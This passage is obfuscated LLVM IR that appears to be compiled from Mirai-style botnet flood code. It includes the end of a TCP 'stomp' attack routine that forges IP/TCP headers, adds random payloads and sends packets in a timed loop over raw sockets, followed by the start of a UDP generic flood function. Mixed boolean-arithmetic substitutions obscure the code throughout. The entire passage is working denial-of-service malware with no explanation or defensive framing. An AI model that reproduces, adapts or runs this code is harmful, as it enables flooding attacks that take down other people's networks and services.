  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 1
  store i8 %375, i8* %377, align 1
  %378 = load i32, i32* %26, align 4
  %379 = sext i32 %378 to i64
  %380 = sub i64 0, %379
  %381 = sub i64 40, %380
  %382 = add i64 40, %379
  %383 = trunc i64 %381 to i16
  %384 = call zeroext i16 @htons(i16 zeroext %383) #7
  %385 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %386 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %385, i32 0, i32 2
  store i16 %384, i16* %386, align 2
  %387 = load i16, i16* %16, align 2
  %388 = call zeroext i16 @htons(i16 zeroext %387) #7
  %389 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 3
  store i16 %388, i16* %390, align 4
  %391 = load i8, i8* %17, align 1
  %392 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 5
  store i8 %391, i8* %393, align 4
  %394 = load i8, i8* %18, align 1
  %395 = icmp ne i8 %394, 0
  br i1 %395, label %396, label %400

; <label>:396:                                    ; preds = %271
  %397 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %398 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 4
  store i16 %397, i16* %399, align 2
  br label %400

; <label>:400:                                    ; preds = %396, %271
  %401 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 6
  store i8 6, i8* %402, align 1
  %403 = load i32, i32* @LOCAL_ADDR, align 4
  %404 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 8
  store i32 %403, i32* %405, align 4
  %406 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %407 = load i32, i32* %11, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %409, i32 0, i32 0
  %411 = load i32, i32* %410, align 4
  %412 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 9
  store i32 %411, i32* %413, align 4
  %414 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %415 = load i32, i32* %11, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %417, i32 0, i32 3
  %419 = load i16, i16* %418, align 4
  %420 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 0
  store i16 %419, i16* %421, align 4
  %422 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %423 = load i32, i32* %11, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %425, i32 0, i32 4
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 1
  store i16 %427, i16* %429, align 2
  %430 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %431 = load i32, i32* %11, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %430, i64 %432
  %434 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %433, i32 0, i32 2
  %435 = load i32, i32* %434, align 4
  %436 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %437 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %436, i32 0, i32 2
  store i32 %435, i32* %437, align 4
  %438 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %439 = load i32, i32* %11, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %438, i64 %440
  %442 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %441, i32 0, i32 1
  %443 = load i32, i32* %442, align 4
  %444 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %445 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %444, i32 0, i32 3
  store i32 %443, i32* %445, align 4
  %446 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 4
  %448 = load i16, i16* %447, align 4
  %449 = xor i16 %448, -1
  %450 = xor i16 -241, -1
  %451 = xor i16 -17898, -1
  %452 = or i16 %449, %450
  %453 = or i16 -17898, %451
  %454 = xor i16 %452, -1
  %455 = and i16 %454, %453
  %456 = and i16 %448, -241
  %457 = and i16 %455, 128
  %458 = xor i16 %455, 128
  %459 = or i16 %457, %458
  %460 = or i16 %455, 128
  store i16 %459, i16* %447, align 4
  %461 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 4
  %463 = load i16, i16* %462, align 4
  %464 = xor i16 %463, -1
  %465 = xor i16 -257, -1
  %466 = xor i16 -22554, -1
  %467 = or i16 %464, %465
  %468 = or i16 -22554, %466
  %469 = xor i16 %467, -1
  %470 = and i16 %469, %468
  %471 = and i16 %463, -257
  %472 = and i16 %470, 256
  %473 = xor i16 %470, 256
  %474 = or i16 %472, %473
  %475 = or i16 %470, 256
  store i16 %474, i16* %462, align 4
  %476 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %477 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %476, i32 0, i32 4
  %478 = load i16, i16* %477, align 4
  %479 = xor i16 -4097, -1
  %480 = xor i16 %478, %479
  %481 = and i16 %480, %478
  %482 = and i16 %478, -4097
  %483 = and i16 %481, 4096
  %484 = xor i16 %481, 4096
  %485 = or i16 %483, %484
  %486 = or i16 %481, 4096
  store i16 %485, i16* %477, align 4
  %487 = call i32 @rand_next()
  %488 = xor i32 65535, -1
  %489 = xor i32 %487, %488
  %490 = and i32 %489, %487
  %491 = and i32 %487, 65535
  %492 = trunc i32 %490 to i16
  %493 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %494 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %493, i32 0, i32 5
  store i16 %492, i16* %494, align 2
  %495 = load i8, i8* %20, align 1
  %496 = sext i8 %495 to i16
  %497 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %498 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %497, i32 0, i32 4
  %499 = load i16, i16* %498, align 4
  %500 = xor i16 %496, -1
  %501 = xor i16 1, -1
  %502 = xor i16 8546, -1
  %503 = or i16 %500, %501
  %504 = or i16 8546, %502
  %505 = xor i16 %503, -1
  %506 = and i16 %505, %504
  %507 = and i16 %496, 1
  %508 = shl i16 %506, 13
  %509 = xor i16 %499, -1
  %510 = xor i16 -8193, -1
  %511 = xor i16 -32040, -1
  %512 = or i16 %509, %510
  %513 = or i16 -32040, %511
  %514 = xor i16 %512, -1
  %515 = and i16 %514, %513
  %516 = and i16 %499, -8193
  %517 = and i16 %515, %508
  %518 = xor i16 %515, %508
  %519 = or i16 %517, %518
  %520 = or i16 %515, %508
  store i16 %519, i16* %498, align 4
  %521 = load i8, i8* %21, align 1
  %522 = sext i8 %521 to i16
  %523 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 4
  %525 = load i16, i16* %524, align 4
  %526 = xor i16 1, -1
  %527 = xor i16 %522, %526
  %528 = and i16 %527, %522
  %529 = and i16 %522, 1
  %530 = shl i16 %528, 12
  %531 = xor i16 -4097, -1
  %532 = xor i16 %525, %531
  %533 = and i16 %532, %525
  %534 = and i16 %525, -4097
  %535 = xor i16 %533, -1
  %536 = xor i16 %530, -1
  %537 = xor i16 23493, -1
  %538 = and i16 %535, 23493
  %539 = and i16 %533, %537
  %540 = and i16 %536, 23493
  %541 = and i16 %530, %537
  %542 = or i16 %538, %539
  %543 = or i16 %540, %541
  %544 = xor i16 %542, %543
  %545 = or i16 %535, %536
  %546 = xor i16 %545, -1
  %547 = or i16 23493, %537
  %548 = and i16 %546, %547
  %549 = or i16 %544, %548
  %550 = or i16 %533, %530
  store i16 %549, i16* %524, align 4
  %551 = load i8, i8* %22, align 1
  %552 = sext i8 %551 to i16
  %553 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %554 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %553, i32 0, i32 4
  %555 = load i16, i16* %554, align 4
  %556 = xor i16 1, -1
  %557 = xor i16 %552, %556
  %558 = and i16 %557, %552
  %559 = and i16 %552, 1
  %560 = shl i16 %558, 11
  %561 = xor i16 %555, -1
  %562 = xor i16 -2049, -1
  %563 = xor i16 25314, -1
  %564 = or i16 %561, %562
  %565 = or i16 25314, %563
  %566 = xor i16 %564, -1
  %567 = and i16 %566, %565
  %568 = and i16 %555, -2049
  %569 = and i16 %567, %560
  %570 = xor i16 %567, %560
  %571 = or i16 %569, %570
  %572 = or i16 %567, %560
  store i16 %571, i16* %554, align 4
  %573 = load i8, i8* %23, align 1
  %574 = sext i8 %573 to i16
  %575 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %576 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %575, i32 0, i32 4
  %577 = load i16, i16* %576, align 4
  %578 = xor i16 1, -1
  %579 = xor i16 %574, %578
  %580 = and i16 %579, %574
  %581 = and i16 %574, 1
  %582 = shl i16 %580, 10
  %583 = xor i16 -1025, -1
  %584 = xor i16 %577, %583
  %585 = and i16 %584, %577
  %586 = and i16 %577, -1025
  %587 = and i16 %585, %582
  %588 = xor i16 %585, %582
  %589 = or i16 %587, %588
  %590 = or i16 %585, %582
  store i16 %589, i16* %576, align 4
  %591 = load i8, i8* %24, align 1
  %592 = sext i8 %591 to i16
  %593 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %594 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %593, i32 0, i32 4
  %595 = load i16, i16* %594, align 4
  %596 = xor i16 %592, -1
  %597 = xor i16 1, -1
  %598 = xor i16 -6628, -1
  %599 = or i16 %596, %597
  %600 = or i16 -6628, %598
  %601 = xor i16 %599, -1
  %602 = and i16 %601, %600
  %603 = and i16 %592, 1
  %604 = shl i16 %602, 9
  %605 = xor i16 -513, -1
  %606 = xor i16 %595, %605
  %607 = and i16 %606, %595
  %608 = and i16 %595, -513
  %609 = xor i16 %607, -1
  %610 = xor i16 %604, -1
  %611 = xor i16 31648, -1
  %612 = and i16 %609, 31648
  %613 = and i16 %607, %611
  %614 = and i16 %610, 31648
  %615 = and i16 %604, %611
  %616 = or i16 %612, %613
  %617 = or i16 %614, %615
  %618 = xor i16 %616, %617
  %619 = or i16 %609, %610
  %620 = xor i16 %619, -1
  %621 = or i16 31648, %611
  %622 = and i16 %620, %621
  %623 = or i16 %618, %622
  %624 = or i16 %607, %604
  store i16 %623, i16* %594, align 4
  %625 = load i8, i8* %25, align 1
  %626 = sext i8 %625 to i16
  %627 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %628 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %627, i32 0, i32 4
  %629 = load i16, i16* %628, align 4
  %630 = xor i16 %626, -1
  %631 = xor i16 1, -1
  %632 = xor i16 32385, -1
  %633 = or i16 %630, %631
  %634 = or i16 32385, %632
  %635 = xor i16 %633, -1
  %636 = and i16 %635, %634
  %637 = and i16 %626, 1
  %638 = shl i16 %636, 8
  %639 = xor i16 -257, -1
  %640 = xor i16 %629, %639
  %641 = and i16 %640, %629
  %642 = and i16 %629, -257
  %643 = xor i16 %641, -1
  %644 = xor i16 %638, -1
  %645 = xor i16 -32749, -1
  %646 = and i16 %643, -32749
  %647 = and i16 %641, %645
  %648 = and i16 %644, -32749
  %649 = and i16 %638, %645
  %650 = or i16 %646, %647
  %651 = or i16 %648, %649
  %652 = xor i16 %650, %651
  %653 = or i16 %643, %644
  %654 = xor i16 %653, -1
  %655 = or i16 -32749, %645
  %656 = and i16 %654, %655
  %657 = or i16 %652, %656
  %658 = or i16 %641, %638
  store i16 %657, i16* %628, align 4
  %659 = load i8*, i8** %41, align 8
  %660 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %659, i32 %660)
  %661 = load i8*, i8** %41, align 8
  %662 = load i32, i32* %26, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds i8, i8* %661, i64 %663
  store i8 0, i8* %664, align 1
  br label %705

; <label>:665:                                    ; preds = %260, %249
  %666 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %667 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %666, i32 0, i32 4
  %668 = load i16, i16* %667, align 4
  %669 = lshr i16 %668, 8
  %670 = xor i16 1, -1
  %671 = xor i16 %669, %670
  %672 = and i16 %671, %669
  %673 = and i16 %669, 1
  %674 = zext i16 %672 to i32
  %675 = icmp ne i32 %674, 0
  br i1 %675, label %687, label %676

; <label>:676:                                    ; preds = %665
  %677 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %678 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %677, i32 0, i32 4
  %679 = load i16, i16* %678, align 4
  %680 = lshr i16 %679, 10
  %681 = xor i16 1, -1
  %682 = xor i16 %680, %681
  %683 = and i16 %682, %680
  %684 = and i16 %680, 1
  %685 = zext i16 %683 to i32
  %686 = icmp ne i32 %685, 0
  br i1 %686, label %687, label %690

; <label>:687:                                    ; preds = %676, %665
  %688 = load i32, i32* %29, align 4
  %689 = call i32 @close(i32 %688)
  br label %131

; <label>:690:                                    ; preds = %676
  br label %691

; <label>:691:                                    ; preds = %690
  br label %692

; <label>:692:                                    ; preds = %691, %237
  br label %693

; <label>:693:                                    ; preds = %692, %233, %225
  %694 = call i64 @time(i64* null) #6
  %695 = load i64, i64* %34, align 8
  %696 = add i64 %694, 9160009979945255012
  %697 = sub i64 %696, %695
  %698 = sub i64 %697, 9160009979945255012
  %699 = sub nsw i64 %694, %695
  %700 = icmp sgt i64 %698, 10
  br i1 %700, label %701, label %704

; <label>:701:                                    ; preds = %693
  %702 = load i32, i32* %29, align 4
  %703 = call i32 @close(i32 %702)
  br label %131

; <label>:704:                                    ; preds = %693
  br label %213

; <label>:705:                                    ; preds = %400
  br label %706

; <label>:706:                                    ; preds = %705, %134
  %707 = load i32, i32* %11, align 4
  %708 = sub i32 0, 1
  %709 = sub i32 %707, %708
  %710 = add nsw i32 %707, 1
  store i32 %709, i32* %11, align 4
  br label %125

; <label>:711:                                    ; preds = %125
  br label %712

; <label>:712:                                    ; preds = %856, %711
  store i32 0, i32* %11, align 4
  br label %713

; <label>:713:                                    ; preds = %843, %712
  %714 = load i32, i32* %11, align 4
  %715 = load i8, i8* %7, align 1
  %716 = zext i8 %715 to i32
  %717 = icmp slt i32 %714, %716
  br i1 %717, label %718, label %850

; <label>:718:                                    ; preds = %713
  %719 = load i8**, i8*** %14, align 8
  %720 = load i32, i32* %11, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds i8*, i8** %719, i64 %721
  %723 = load i8*, i8** %722, align 8
  store i8* %723, i8** %42, align 8
  %724 = load i8*, i8** %42, align 8
  %725 = bitcast i8* %724 to %struct.iphdr*
  store %struct.iphdr* %725, %struct.iphdr** %43, align 8
  %726 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %727 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %726, i64 1
  %728 = bitcast %struct.iphdr* %727 to %struct.tcphdr*
  store %struct.tcphdr* %728, %struct.tcphdr** %44, align 8
  %729 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %730 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %729, i64 1
  %731 = bitcast %struct.tcphdr* %730 to i8*
  store i8* %731, i8** %45, align 8
  %732 = load i16, i16* %16, align 2
  %733 = zext i16 %732 to i32
  %734 = icmp eq i32 %733, 65535
  br i1 %734, label %735, label %748

; <label>:735:                                    ; preds = %718
  %736 = call i32 @rand_next()
  %737 = xor i32 %736, -1
  %738 = xor i32 65535, -1
  %739 = xor i32 510271793, -1
  %740 = or i32 %737, %738
  %741 = or i32 510271793, %739
  %742 = xor i32 %740, -1
  %743 = and i32 %742, %741
  %744 = and i32 %736, 65535
  %745 = trunc i32 %743 to i16
  %746 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %747 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %746, i32 0, i32 3
  store i16 %745, i16* %747, align 4
  br label %748

; <label>:748:                                    ; preds = %735, %718
  %749 = load i8, i8* %27, align 1
  %750 = icmp ne i8 %749, 0
  br i1 %750, label %751, label %758

; <label>:751:                                    ; preds = %748
  %752 = load i8*, i8** %45, align 8
  %753 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %752, i32 %753)
  %754 = load i8*, i8** %45, align 8
  %755 = load i32, i32* %26, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds i8, i8* %754, i64 %756
  store i8 0, i8* %757, align 1
  br label %758

; <label>:758:                                    ; preds = %751, %748
  %759 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %760 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %759, i32 0, i32 7
  store i16 0, i16* %760, align 2
  %761 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %762 = bitcast %struct.iphdr* %761 to i16*
  %763 = call zeroext i16 @checksum_generic(i16* %762, i32 20)
  %764 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %765 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %764, i32 0, i32 7
  store i16 %763, i16* %765, align 2
  %766 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %767 = load i32, i32* %11, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %766, i64 %768
  %770 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %769, i32 0, i32 1
  %771 = load i32, i32* %770, align 4
  %772 = add i32 %771, -1115919074
  %773 = add i32 %772, 1
  %774 = sub i32 %773, -1115919074
  %775 = add i32 %771, 1
  store i32 %774, i32* %770, align 4
  %776 = trunc i32 %771 to i16
  %777 = call zeroext i16 @htons(i16 zeroext %776) #7
  %778 = zext i16 %777 to i32
  %779 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %780 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %779, i32 0, i32 2
  store i32 %778, i32* %780, align 4
  %781 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %782 = load i32, i32* %11, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %781, i64 %783
  %785 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %784, i32 0, i32 2
  %786 = load i32, i32* %785, align 4
  %787 = trunc i32 %786 to i16
  %788 = call zeroext i16 @htons(i16 zeroext %787) #7
  %789 = zext i16 %788 to i32
  %790 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %791 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %790, i32 0, i32 3
  store i32 %789, i32* %791, align 4
  %792 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %793 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %792, i32 0, i32 6
  store i16 0, i16* %793, align 4
  %794 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %795 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %796 = bitcast %struct.tcphdr* %795 to i8*
  %797 = load i32, i32* %26, align 4
  %798 = sext i32 %797 to i64
  %799 = sub i64 20, 8925818214714735421
  %800 = add i64 %799, %798
  %801 = add i64 %800, 8925818214714735421
  %802 = add i64 20, %798
  %803 = trunc i64 %801 to i16
  %804 = call zeroext i16 @htons(i16 zeroext %803) #7
  %805 = load i32, i32* %26, align 4
  %806 = sext i32 %805 to i64
  %807 = sub i64 0, 20
  %808 = sub i64 0, %806
  %809 = add i64 %807, %808
  %810 = sub i64 0, %809
  %811 = add i64 20, %806
  %812 = trunc i64 %810 to i32
  %813 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %794, i8* %796, i16 zeroext %804, i32 %812)
  %814 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %815 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %814, i32 0, i32 6
  store i16 %813, i16* %815, align 4
  %816 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %817 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %816, i32 0, i32 1
  %818 = load i16, i16* %817, align 2
  %819 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %820 = load i32, i32* %11, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %819, i64 %821
  %823 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %822, i32 0, i32 0
  %824 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %823, i32 0, i32 1
  store i16 %818, i16* %824, align 2
  %825 = load i32, i32* %12, align 4
  %826 = load i8*, i8** %42, align 8
  %827 = load i32, i32* %26, align 4
  %828 = sext i32 %827 to i64
  %829 = sub i64 40, -8064021128879679111
  %830 = add i64 %829, %828
  %831 = add i64 %830, -8064021128879679111
  %832 = add i64 40, %828
  %833 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %834 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %835 = load i32, i32* %11, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %834, i64 %836
  %838 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %837, i32 0, i32 0
  %839 = bitcast %struct.sockaddr_in* %838 to %struct.sockaddr*
  store %struct.sockaddr* %839, %struct.sockaddr** %833, align 8
  %840 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %841 = load %struct.sockaddr*, %struct.sockaddr** %840, align 8
  %842 = call i64 @sendto(i32 %825, i8* %826, i64 %831, i32 16384, %struct.sockaddr* %841, i32 16)
  br label %843

; <label>:843:                                    ; preds = %758
  %844 = load i32, i32* %11, align 4
  %845 = sub i32 0, %844
  %846 = sub i32 0, 1
  %847 = add i32 %845, %846
  %848 = sub i32 0, %847
  %849 = add nsw i32 %844, 1
  store i32 %848, i32* %11, align 4
  br label %713

; <label>:850:                                    ; preds = %713
  %851 = call i64 @time(i64* null) #6
  %852 = load i32, i32* %28, align 4
  %853 = sext i32 %852 to i64
  %854 = icmp sgt i64 %851, %853
  br i1 %854, label %855, label %856

; <label>:855:                                    ; preds = %850
  br label %857

; <label>:856:                                    ; preds = %850
  br label %712

; <label>:857:                                    ; preds = %855, %224, %121, %115
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 24, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = sub i64 %71, 8646130043427384972
  %75 = add i64 %74, %73
  %76 = add i64 %75, 8646130043427384972
  %77 = add nsw i64 %71, %73
  %78 = trunc i64 %76 to i32
  store i32 %78, i32* %23, align 4
  %79 = load i16, i16* %20, align 2
  %80 = zext i16 %79 to i32
  %81 = icmp sgt i32 %80, 1460
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %83

; <label>:83:                                     ; preds = %82, %5
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %83
  br label %364

; <label>:87:                                     ; preds = %83
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  br label %364

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %11, align 4
  br label %96

; <label>:96:                                     ; preds = %196, %95
  %97 = load i32, i32* %11, align 4
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %201

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %103 = load i8**, i8*** %13, align 8
